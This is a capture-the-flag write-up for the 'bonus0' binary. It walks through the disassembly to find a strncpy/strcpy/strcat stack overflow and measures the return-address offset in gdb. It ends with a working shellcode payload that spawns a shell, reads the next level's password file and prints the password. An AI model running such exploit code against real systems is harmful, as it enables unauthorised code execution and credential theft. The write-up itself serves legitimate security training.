# 

```shell
~$ ./bonus0 
 - 
a
 - 
b
a b
```
The program waits for 2 inputs and then prints them.

```asm
080485a4 <main>:
 80485a4:	55                   	push   ebp
 80485a5:	89 e5                	mov    ebp,esp
 80485a7:	83 e4 f0             	and    esp,0xfffffff0
 80485aa:	83 ec 40             	sub    esp,0x40              
 80485ad:	8d 44 24 16          	lea    eax,[esp+0x16]      ; load a buffer of
                                                               ; 0x40 - 0x16 = 42 bytes
 80485b1:	89 04 24             	mov    DWORD PTR [esp],eax
 80485b4:	e8 65 ff ff ff       	call   804851e <pp>        ; call pp to fill it
 80485b9:	8d 44 24 16          	lea    eax,[esp+0x16]
 80485bd:	89 04 24             	mov    DWORD PTR [esp],eax
 80485c0:	e8 eb fd ff ff       	call   80483b0 <puts@plt>  ; then call puts to print it
 80485c5:	b8 00 00 00 00       	mov    eax,0x0
 80485ca:	c9                   	leave  
 80485cb:	c3                   	ret    
```
Vulnerability probably in pp

```shell
(gdb) p (char*) 0x80486a0
```
```asm
0804851e <pp>:
 804851e:	55                   	push   ebp
 804851f:	89 e5                	mov    ebp,esp
 8048521:	57                   	push   edi
 8048522:	53                   	push   ebx
 8048523:	83 ec 50             	sub    esp,0x50
 8048526:	c7 44 24 04 a0 86 04 	mov    DWORD PTR [esp+0x4],0x80486a0
 804852d:	08 
 804852e:	8d 45 d0             	lea    eax,[ebp-0x30]        
 8048531:	89 04 24             	mov    DWORD PTR [esp],eax   
 8048534:	e8 7b ff ff ff       	call   80484b4 <p>
 8048539:	c7 44 24 04 a0 86 04 	mov    DWORD PTR [esp+0x4],0x80486a0
 8048540:	08 
 8048541:	8d 45 e4             	lea    eax,[ebp-0x1c]
 8048544:	89 04 24             	mov    DWORD PTR [esp],eax
 8048547:	e8 68 ff ff ff       	call   80484b4 <p>
```
- Create two buffers on the stack, one at [ebp-0x30] and one at [ebp-0x1c]
- Call p to fill them, print " - " before each call, so the user can know which buffer is filling

```asm
 804854c:	8d 45 d0             	lea    eax,[ebp-0x30]
 804854f:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048553:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 8048556:	89 04 24             	mov    DWORD PTR [esp],eax
 8048559:	e8 42 fe ff ff       	call   80483a0 <strcpy@plt>
```
Then strcpy the 0x30 buffer of pp into the buffer of main, strcpy is not protected against overlapping buffers

```asm
 804855e:	bb a4 86 04 08       	mov    ebx,0x80486a4
 8048563:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 8048566:	c7 45 c4 ff ff ff ff 	mov    DWORD PTR [ebp-0x3c],0xffffffff
 804856d:	89 c2                	mov    edx,eax
 804856f:	b8 00 00 00 00       	mov    eax,0x0
 8048574:	8b 4d c4             	mov    ecx,DWORD PTR [ebp-0x3c]
 8048577:	89 d7                	mov    edi,edx
 8048579:	f2 ae                	repnz scas al,BYTE PTR es:[edi]
 804857b:	89 c8                	mov    eax,ecx
 804857d:	f7 d0                	not    eax
 804857f:	83 e8 01             	sub    eax,0x1
 8048582:	03 45 08             	add    eax,DWORD PTR [ebp+0x8]
 8048585:	0f b7 13             	movzx  edx,WORD PTR [ebx]
 8048588:	66 89 10             	mov    WORD PTR [eax],dx
 804858b:	8d 45 e4             	lea    eax,[ebp-0x1c]
 804858e:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048592:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 8048595:	89 04 24             	mov    DWORD PTR [esp],eax
 8048598:	e8 f3 fd ff ff       	call   8048390 <strcat@plt>
 804859d:	83 c4 50             	add    esp,0x50
 80485a0:	5b                   	pop    ebx
 80485a1:	5f                   	pop    edi
 80485a2:	5d                   	pop    ebp
 80485a3:	c3                   	ret
```
- Then the lenght of the main buffer is calculated to put a '\0' at the end of it.
- Then the 0x1c buffer of pp is strcat at the end of the main buffer, strcat is also not protected against overlapping buffers
- Lets see if p protects against buffer overflow

```asm
080484b4 <p>:
 80484b4:	55                   	push   ebp
 80484b5:	89 e5                	mov    ebp,esp
 80484b7:	81 ec 18 10 00 00    	sub    esp,0x1018
 80484bd:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 80484c0:	89 04 24             	mov    DWORD PTR [esp],eax
 80484c3:	e8 e8 fe ff ff       	call   80483b0 <puts@plt>
 80484c8:	c7 44 24 08 00 10 00 	mov    DWORD PTR [esp+0x8],0x1000
 80484cf:	00 
 80484d0:	8d 85 f8 ef ff ff    	lea    eax,[ebp-0x1008]
 80484d6:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 80484da:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
 80484e1:	e8 9a fe ff ff       	call   8048380 <read@plt>
 80484e6:	c7 44 24 04 0a 00 00 	mov    DWORD PTR [esp+0x4],0xa
 80484ed:	00 
 80484ee:	8d 85 f8 ef ff ff    	lea    eax,[ebp-0x1008]
 80484f4:	89 04 24             	mov    DWORD PTR [esp],eax
 80484f7:	e8 d4 fe ff ff       	call   80483d0 <strchr@plt>
 80484fc:	c6 00 00             	mov    BYTE PTR [eax],0x0
 80484ff:	8d 85 f8 ef ff ff    	lea    eax,[ebp-0x1008]
 8048505:	c7 44 24 08 14 00 00 	mov    DWORD PTR [esp+0x8],0x14
 804850c:	00 
 804850d:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048511:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 8048514:	89 04 24             	mov    DWORD PTR [esp],eax
 8048517:	e8 d4 fe ff ff       	call   80483f0 <strncpy@plt>
 804851c:	c9                   	leave  
```
- p reads 0x1000 bytes (4096 bytes) from stdin into a buffer of 0x1008 bytes, so it is protected against buffer overflow
- Then it looks for the first '\n' and replace it with a '\0'
- Then it strncpy at most 0x14 bytes of the buffer into the buffer given as argument of p, but if its local buffer is bigger than 0x14 bytes, it will not be null-terminated if we input more than 0x14 bytes.
- So if 1st arg >= 20 bytes and 2nd arg < 20 bytes, in the main buffer we will have `arg1+arg2 arg2` with so 20+20+1+20 = 61 bytes, the buffer is only 42, can we overlap the return address ?

```shell
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
12345678901234567890
 - 
abcdefghijklmnopqrstu
12345678901234567890abcdefghijklmnopqrst��� abcdefghijklmnopqrst���

Program received signal SIGSEGV, Segmentation fault.
0x6d6c6b6a in ?? ()
```
- We find the offset of the return address of pp on the stack : 0x6d6c6b6a = "jklm" in little endian, so the offset is 9 bytes, we can put here the address of our shellcode

```shell
(gdb) b *p+28
(gdb) run
Starting program: /home/user/bonus0/bonus0
Breakpoint 1, 0x080484d0 in p ()
(gdb) x $ebp-0x1008
0xbfffe680:     0x00000000
```
- Our shellcode will be at 0xbfffe680, this address must substitute the return address of pp

```
1st write: | offset (NOPs) *>22                                                    | shellcode [21 bytes] |
2nd write: | offset (NOPs) *9  | address of shellcode *4 | offset (NOPs) *(20-4-9) |
```
- Buffer of p : will be filled twice, so we need to offset the first write by the size of the second write
- The second write is 20 bytes to dont be null-terminated, containing at the 10th bytes the address of the shellcode

```shell
~$ (python -c 'print "\x90" * 30 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "\x90"*9 + "\xc5\xe6\xff\xbf" + "\x90"*7' ; cat) | ./bonus0
 - 
 - 
������������������������������������������� �����������������������
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
